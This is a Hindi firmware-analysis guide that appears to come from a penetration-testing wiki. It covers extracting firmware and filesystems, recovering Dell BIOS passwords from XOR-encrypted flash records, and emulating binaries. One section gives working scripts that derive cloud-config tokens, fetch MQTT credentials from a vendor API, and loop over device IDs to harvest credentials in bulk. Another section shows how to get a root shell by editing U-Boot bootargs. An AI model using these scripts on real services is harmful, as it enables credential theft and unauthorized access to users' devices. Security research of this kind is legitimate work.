# Firmware विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

उजागर hardware interfaces से firmware प्राप्त करने के लिए, [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) और [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) देखें। Console access से पहले, boot के समय बार-बार UART capture करने के लिए [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) देखें।

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है, जो hardware components और उपयोगकर्ताओं के संपर्क में आने वाले software के बीच संचार को प्रबंधित और सुगम बनाकर devices को सही ढंग से काम करने में सक्षम बनाता है। यह स्थायी memory में संग्रहित होता है, जिससे device चालू होते ही आवश्यक निर्देश उपलब्ध रहते हैं और operating system शुरू हो जाता है। Security vulnerabilities की पहचान करने के लिए firmware की जाँच करना और संभावित रूप से उसमें बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी जुटाना**

**जानकारी जुटाना** किसी device की बनावट और उसमें इस्तेमाल की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित के बारे में डेटा इकट्ठा किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader के विवरण
- Hardware layout और datasheets
- Codebase के metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architecture और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बहुत उपयोगी हैं। उपलब्ध open-source software components का manual और automated review के ज़रिए विश्लेषण भी उतना ही उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools संभावित समस्याएँ खोजने के लिए मुफ़्त static analysis उपलब्ध कराते हैं।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता अलग-अलग होती है:

- Source (developers, manufacturers) से **सीधे**
- दिए गए निर्देशों के अनुसार **बनाकर**
- Official support sites से **डाउनलोड करके**
- Hosted firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** को सीधे access करके
- Man-in-the-middle techniques से **updates** को intercept करके
- Device से **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), या **PICit** जैसे connections के ज़रिए **निकालकर**
- Device communication के भीतर update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके उनका उपयोग करके
- Bootloader या network से **dump करके**
- जब कोई और तरीका काम न करे, तो उपयुक्त hardware tools से storage chip **निकालकर और पढ़कर**

### केवल UART logs: Flash में U-Boot env के ज़रिए root shell चालू करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ़ logs मिलते हैं), तो भी आप **U-Boot environment blob को offline edit करके** init shell चालू कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition ढूँढें, `bootargs` में `init=/bin/sh` जोड़ें और blob के लिए **U-Boot env CRC32 दोबारा गणना करें**।
3. केवल env partition को फिर से flash करें और reboot करें; UART पर shell दिखाई देनी चाहिए।

यह उन embedded devices में उपयोगी है जहाँ bootloader shell अक्षम है, लेकिन external flash access के ज़रिए env partition में लिखा जा सकता है।

### Firewall copy task के ज़रिए protected code का खुलासा

कुछ MCUs में unprotected application code, protected Flash को सीधे पढ़ने के बजाय protected-region gateway को call कर सकता है। Application code execution मिलने के बाद, हर gateway task को एक अलग memory-transfer primitive के रूप में जाँचें। Cypherock X1 मामले में, STM32L4 Firewall call gate एक task, external `data` pointer, length और protected `address` स्वीकार करता था। एक write task, `data` source pointer के Firewall Code के भीतर होने पर उसे अस्वीकार नहीं करता था। Caller उस code को सीधे नहीं पढ़ सकता था, लेकिन gateway खुद उसे protected non-volatile storage में copy कर सकता था, जिसे एक अनुमत read task के ज़रिए पढ़ा जा सकता था।<sup>[[15]](#references)</sup>

इस तरह के disclosure को दोहराने के लिए, संबंधित read task वाला writable protected storage page ढूँढें, write source को क्रमशः अलग-अलग protected-code addresses पर सेट करें और staged bytes को पढ़ें। Writes दोहराने से पहले storage medium जाँचें: इस मामले में यह Flash था, इसलिए page को दोबारा इस्तेमाल करने से पहले erase करना ज़रूरी था। शोधकर्ताओं ने एक ऐसा routine इस्तेमाल किया जिसने Secure Data Storage के वैध contents को erase करके restore किया, फिर wallet data को overwrite करने के बजाय बची हुई खाली जगह में code stage किया। इसके लिए MCU पर code execution और पहुँच योग्य call gate ज़रूरी है; यह unauthenticated host से सीधे read bypass नहीं है।<sup>[[15]](#references)</sup>

बरामद code, [firmware-update और boot-integrity में trust gaps](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) उजागर कर सकता है।<sup>[[15]](#references)</sup>

## Analyzing the firmware

अब जब आपके पास **firmware है**, तो यह जानने के लिए कि इसके साथ कैसे काम करना है, आपको इससे जानकारी निकालनी होगी। इसके लिए आप अलग-अलग tools इस्तेमाल कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर इन tools से ज़्यादा जानकारी न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। Entropy कम हो, तो image के encrypted होने की संभावना कम है। Entropy ज़्यादा हो, तो संभव है कि वह encrypted हो (या किसी तरह compressed हो)।

इसके अलावा, **firmware के अंदर embedded files** extract करने के लिए इन tools का इस्तेमाल कर सकते हैं:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का इस्तेमाल करें।

### External flash में raw display assets

External SPI dump में ज़रूरी नहीं कि MCU का executable firmware ही हो। Cortex-M target के लिए, हर संभावित code region की शुरुआत की तुलना device memory map से करें: सामान्य vector table की शुरुआत में एक संभावित SRAM stack pointer और executable memory में reset-handler address होता है। केवल offset zero पर vector table न मिलना यह साबित नहीं करता कि पूरे chip में code नहीं है; दूसरे offsets और boot arrangement की जाँच करें। अगर `binwalk` को कोई container न मिले, तो raw bytes का निरीक्षण करें और [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) से flash read addresses को नई screens load करने वाली कार्रवाइयों से मिलाएँ।<sup>[[14]](#references)</sup>

Display-asset region के लिए PNG/JPEG मानकर चलने के बजाय, pixel formats और dimensions के संभावित विकल्प आज़माएँ। संदर्भित device में **80×160 RGB565 little-endian** frames का इस्तेमाल हुआ था: दो bytes प्रति pixel के हिसाब से एक frame **25,600 bytes** (25 KiB) का होता है, 24 kilobits का नहीं। Decoded flash-read address से screen asset का offset पता चला; researcher ने तैयार image को `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` से convert किया, original dump में उतने ही आकार के asset को replace किया, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` से उसे लिखा, और display पर नई image की पुष्टि की। यह writable *external display assets* का उदाहरण है, MCU के internal firmware को extract या reflash करने का नहीं। कोई भी write करने से पहले original dump सुरक्षित रखें और dimensions, byte order, offset, तथा replacement length की पुष्टि करें।<sup>[[14]](#references)</sup>

### Differential flash analysis और recoverable XOR secret stores

जब किसी firmware setting का storage format documented न हो, तो पहले flash को कई बार पढ़ें, **ठीक एक** setting बदलें, फिर पूरे chip का dump दोबारा लें और offsets की तुलना करें। Controlled values के साथ प्रयोग दोहराने से setting में हुए बदलावों को counters और write metadata से अलग पहचाना जा सकता है; अगर बदलाव in-place होने के बजाय नए offsets पर हों, तो इसका मतलब append-only या log-structured store हो सकता है। Deleted/tombstoned entries को सुरक्षित रखें, क्योंकि उनके payload bytes recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे tools से firmware modules निकालें और Ghidra में writer/validator को reverse करें। ciphertext patterns से केवल scheme का अनुमान लगाने के बजाय, code में field boundaries, padding, key indexing और key derivation की पुष्टि करें।<sup>[[12]](#references)</sup>

#### एन्क्रिप्टेड zero padding से keys पुनर्प्राप्त करना

जैसा कि [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताया गया है, known plaintext से उन्हीं offsets पर keystream bytes का पता चलता है। जब किसी fixed-size field की zero padding, repeating XOR key के हर index को कवर करती है, तो वह विशेष रूप से असुरक्षित होती है: एन्क्रिप्टेड padding सीधे उन key bytes को उजागर करती है, क्योंकि `0x00 XOR key_byte = key_byte`। अगर हर key index कवर हो, तो ciphertext tail से key को पुनर्निर्मित करें और भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का असुरक्षित DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में repeating 20-byte key का उपयोग होता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले `L..31` स्थान शून्य थे। जब `L <= 12` होता है, तो ये स्थान हर key index को कवर करते हैं, इसलिए बिना brute force के पूरी key और पासवर्ड रिकवर हो जाते हैं:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### ऐतिहासिक रिकॉर्ड से keys निकालें

हर रिकॉर्ड का अलग-अलग विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से derive होती है: device seed और GUID स्थिर होते हैं, और पासवर्ड पर निर्भर एकमात्र input उसका clear पहला byte होता है। इससे हर device के लिए अधिकतम 256 keys बनती हैं, और एक ही byte से शुरू होने वाले रिकॉर्ड एक ही key साझा करते हैं। उस byte के आधार पर active और deleted रिकॉर्ड को समूहित करें; किसी छोटे पुराने रिकॉर्ड से padding के ज़रिए पूरी key leak हो सकती है और वह किसी मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है, जबकि उस लंबे रिकॉर्ड की अपनी padding पर्याप्त न हो। इसलिए, पुराने ciphertext को मिटाने के बजाय tombstone करने पर पासवर्ड रोटेशन से exposure बढ़ सकता है।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) टूल DVAR ढूँढता है, संभावित रिकॉर्ड को validate करता है, पासवर्ड recover करता है, और raw stored/key bytes दिखा सकता है। किसी checkout से इसे build करें और सत्यापित flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Custom parsers के लिए, record structure, printable-character constraints, zero-padding checks, key entropy और key wrap होने पर consistency का उपयोग करके false positives को अस्वीकार करें। यदि बार-बार किए गए dumps में हर write पर कुछ ही bit flips दिखाई दें, तो देखे गए masks की सूची बनाएँ और इन constraints के आधार पर corrections को rank करें; लेकिन heuristic output को exact recovery के रूप में पेश करने के बजाय ambiguous characters की रिपोर्ट करें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash store करना चाहिए, और log-structured stores में superseded secret material को सुरक्षित रूप से हटाना चाहिए।<sup>[[12]](#references)</sup>

### फाइल सिस्टम प्राप्त करना

पिछले टिप्पणी किए गए tools जैसे `binwalk -ev <bin>` से आप **फाइल सिस्टम extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **फाइल सिस्टम के प्रकार के नाम वाले folder** में extract करता है, जो आमतौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### मैन्युअल फाइल सिस्टम Extraction

कभी-कभी, binwalk के signatures में **फाइल सिस्टम का magic byte नहीं होगा**। ऐसे मामलों में, binwalk का उपयोग करके **फाइल सिस्टम का offset खोजें और compressed filesystem को binary से carve करें**, फिर नीचे दिए गए चरणों के अनुसार उसके प्रकार के आधार पर फाइल सिस्टम को **मैन्युअल रूप से extract** करें।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्नलिखित कमांड भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" डायरेक्टरी में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फ़ाइल सिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फ़ाइल सिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### विभाजित embedded root फ़ाइल सिस्टम का पुनर्निर्माण

यदि raw eMMC/SSD dump में मान्य filesystem header हो, लेकिन उसके metadata offsets नाममात्र partition की सीमा से आगे तक हों, तो उसे तुरंत corrupt न मानें। Embedded boot code, Device Mapper के ज़रिए कई भौतिक ranges से वास्तविक root device बना सकता है, इसलिए एक GPT partition को carve करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरे media image की प्रारंभिक जांच

पहले पुष्टि करें कि acquisition पूरा हो चुका है, आकार स्थिर है और कोई writer अब भी image को hold नहीं कर रहा है। यदि filename में start/end address दिए गए हैं, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल आवश्यक range attach करें; workstation पर किसी untrusted physical volume के विरुद्ध `vgchange -ay` **न चलाएँ**, क्योंकि इससे volume-group collisions और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

मूल init logic या LVM stack को पूरी image देखने की ज़रूरत हो, तो disposable VM का उपयोग करें। Standard boot partition से मिले पुराने boot logs खास तौर पर उपयोगी होते हैं: bootloader ने proprietary-container offsets, component lengths, slot selection, alignment rules और signature verification लॉग किए हो सकते हैं। इन मानों का उपयोग करके embedded command line/kernel/initramfs को carve करें, फिर `file`, magic bytes और `binwalk` से हर output को स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से गलती से initrd, ACPI object या signature kernel के साथ जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map पुनर्प्राप्त करें

Kernel का initramfs निकालें और उसके `/init` तथा storage libraries को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में, `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references खोजें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 में शुरुआत के लिए `r2 -A init`, `afl`, `pdf @ main` और `pdf @ fcn.xxxxx` उपयोगी हैं।<sup>[[9]](#references)</sup>

Linear target, virtual device की लगातार ranges को एक या अधिक backing devices की ranges पर map करता है। दो-segment table अक्सर इस रूप में होती है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

मशीन-कोड की arithmetic को ठीक उसी तरह दोहराएँ, जिसमें integer width, shifts और unit conversions शामिल हैं। उदाहरण के लिए, निम्न expression byte size को 4-KiB boundary तक floor करता है और उसके बाद ही उसे 512-byte sectors में बदलता है; इसे `p4_bytes // 512` से बदलने पर, जब भी partition page-aligned नहीं होता, चुना गया tail `p4_bytes % 4096` से खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

table के क्रम में ranges को bounded chunks में copy करके flat analysis image reconstruct करें, न कि पूरा media dump memory में load करके। इससे host-side mapper devices बनाने से भी बचा जा सकता है। GPT से प्राप्त offsets, reversed sector counts, और परिणामी output length को अलग-अलग assertions के रूप में रखें।<sup>[[9]](#references)</sup>

#### भ्रष्टाचार और constant reconstruction error में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic जाँचें और superblock offset 40 पर little-endian 64-bit `bytes_used` field decode करें। यदि कई असंबंधित structures में extraction विफल हो, तो अपेक्षित positions के आसपास एक व्यापक window खोजें और मजबूत structural candidates की पुष्टि करें: decompressible metadata block, लगातार कई valid directory entries, plausible inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब वही signed delta स्वतंत्र structures को valid बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes की कमी के बजाय segment-start में व्यवस्थित त्रुटि है। orphan recovery या filesystem metadata patch करने की कोशिश करने से पहले, उलटी arithmetic पर लौटें और discarded remainders, signedness, overflow या sector/page rounding की जाँच करें।<sup>[[9]](#references)</sup>

अंत में, protection boundaries को अलग रखें: TPM-sealed LUKS volumes डेटा की confidentiality सुरक्षित रखते हैं, जबकि signed dm-verity mapping root-filesystem की integrity सुरक्षित रखती है। Software TPM, original physical TPM से sealed key को recover नहीं कर सकता। इसी तरह, verity verification छोड़ने वाले research-only init के ज़रिए modified SquashFS को boot करने से उसका signature forge नहीं होता और न ही dm-verity टूटता है।<sup>[[9]](#references)</sup>

## Firmware का विश्लेषण

Firmware प्राप्त होने के बाद, उसकी संरचना और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना ज़रूरी है। इस प्रक्रिया में firmware image का विश्लेषण करने और उससे मूल्यवान डेटा निकालने के लिए विभिन्न tools का उपयोग किया जाता है।

### शुरुआती विश्लेषण के tools

Binary file (जिसे `<bin>` कहा गया है) के शुरुआती निरीक्षण के लिए commands का एक सेट दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem के विवरण समझने में मदद करती हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy से encryption की कमी का संकेत मिलता है, जबकि अधिक entropy संभावित encryption या compression का संकेत देती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइलों की जाँच के लिए **binvis.io** जैसे tools और resources की सिफ़ारिश की जाती है।

### फाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर फाइल सिस्टम निकाला जा सकता है, जो अक्सर फाइल सिस्टम के प्रकार के नाम वाली directory में होता है (जैसे, squashfs, ubifs)। हालाँकि, जब **binwalk** magic bytes न होने के कारण फाइल सिस्टम के प्रकार को पहचानने में विफल रहता है, तो उसे मैन्युअल रूप से निकालना आवश्यक होता है। इसमें फाइल सिस्टम का offset ढूँढ़ने के लिए `binwalk` का उपयोग करना और फिर फाइल सिस्टम को अलग निकालने के लिए `dd` command चलाना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, फ़ाइल सिस्टम के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, उसकी सामग्री को मैन्युअल रूप से निकालने के लिए अलग-अलग कमांड इस्तेमाल किए जाते हैं।

### फ़ाइल सिस्टम विश्लेषण

फ़ाइल सिस्टम निकालने के बाद, सुरक्षा खामियों की खोज शुरू होती है। असुरक्षित नेटवर्क डेमन्स, हार्डकोड किए गए क्रेडेंशियल्स, API endpoints, अपडेट सर्वर की कार्यक्षमताओं, अनकंपाइल किए गए कोड, स्टार्टअप स्क्रिप्ट और ऑफलाइन विश्लेषण के लिए कंपाइल किए गए binaries पर ध्यान दिया जाता है।

जाँचने के लिए **प्रमुख स्थानों** और **आइटम** में शामिल हैं:

- उपयोगकर्ता क्रेडेंशियल्स के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL प्रमाणपत्र और keys
- संभावित कमजोरियों के लिए कॉन्फ़िगरेशन और स्क्रिप्ट फ़ाइलें
- आगे के विश्लेषण के लिए एम्बेडेड binaries
- आम IoT डिवाइस वेब सर्वर और binaries

फ़ाइल सिस्टम में संवेदनशील जानकारी और कमजोरियाँ खोजने में कई टूल मदद करते हैं:

- संवेदनशील जानकारी खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware विश्लेषण के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- स्थिर और डायनामिक विश्लेषण के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### कंपाइल किए गए Binaries की सुरक्षा जाँच

फ़ाइल सिस्टम में मिले सोर्स कोड और कंपाइल किए गए binaries, दोनों की कमजोरियों के लिए बारीकी से जाँच करनी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे टूल असुरक्षित binaries की पहचान करने में मदद करते हैं, जिनका exploit किया जा सकता है।

## व्युत्पन्न URL टोकन के ज़रिए cloud कॉन्फ़िगरेशन और MQTT क्रेडेंशियल्स प्राप्त करना

कई IoT hubs अपने प्रति-डिवाइस कॉन्फ़िगरेशन को ऐसे cloud endpoint से प्राप्त करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware विश्लेषण के दौरान आपको पता चल सकता है कि `<token>` डिवाइस ID से स्थानीय रूप से, hardcoded secret का उपयोग करके बनाया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

इस डिज़ाइन से कोई भी व्यक्ति, जिसे deviceId और STATIC_KEY पता हों, URL को फिर से बना सकता है और cloud कॉन्फ़िगरेशन प्राप्त कर सकता है। इससे अक्सर plaintext MQTT क्रेडेंशियल्स और topic prefixes सामने आते हैं।

व्यावहारिक प्रक्रिया:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs कैप्चर करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- उन लाइनों को खोजें जो cloud config URL pattern और broker address प्रिंट करती हैं, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm प्राप्त करें

- binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 के उपयोग को खोजें।
- algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config और MQTT credentials एकत्र करें

- URL तैयार करें और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Plaintext MQTT और weak topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- Recovered credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events खोजें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएँ (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक क्रमिक suffix होता है।
- आप candidate IDs को iterate करके, tokens derive करके और programmatically configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- Mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets प्राप्त करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** करने में सक्षम बनाती है। इस approach में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से बने virtual machine में transfer करने से आगे की testing में मदद मिल सकती है।

### Individual Binaries को Emulate करना

Single programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` सही विकल्प होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation हेतु `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools पूर्ण firmware emulation को आसान बनाते हैं, प्रक्रिया को automate करते हैं और dynamic analysis में सहायता देते हैं।

### Emulation के लिए split और verified root filesystems का पुनर्निर्माण

यदि SquashFS superblock पढ़ने योग्य है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो `unsquashfs` को तुरंत patch न करें। शुरुआती boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को दोबारा तैयार करें: embedded systems में nominal root partition दिखाई दे सकता है, लेकिन असली filesystem `dm-linear` mapping से बनाया जा सकता है, जो किसी अन्य partition से लिए गए sectors को जोड़ती है। केवल superblock की जाँच सफल हो सकती है, जबकि बाद के सभी metadata blocks गलत जगह पर हों।<sup>[[11]](#references)</sup>

